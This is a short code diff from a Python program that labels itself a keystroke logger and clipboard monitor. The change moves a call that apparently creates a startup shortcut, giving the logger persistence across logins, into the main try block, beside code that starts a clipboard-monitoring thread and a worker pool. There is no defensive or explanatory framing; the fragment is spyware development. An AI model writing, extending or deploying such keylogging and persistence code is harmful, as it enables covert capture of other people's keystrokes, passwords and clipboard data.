@@ -404,7 +404,7 @@ def main():
 
     # Wait for clipboard thread to finish writing before exit
     
-    create_startup_shortcut()
+    
 
     print("[INFO] Starting keystroke logger + clipboard monitor.")
     print(f"       Keystrokes : {OUTPUT_FILE.resolve()}")
@@ -414,6 +414,7 @@ def main():
     poller=None
     clip_thread=None
     try:
+        create_startup_shortcut()
         clip_thread = threading.Thread(target=run_clipboard_monitor,args=(stop_event,), daemon=True)
         clip_thread.start()
         with ThreadPoolExecutor(max_workers=5, thread_name_prefix="Worker") as executor:
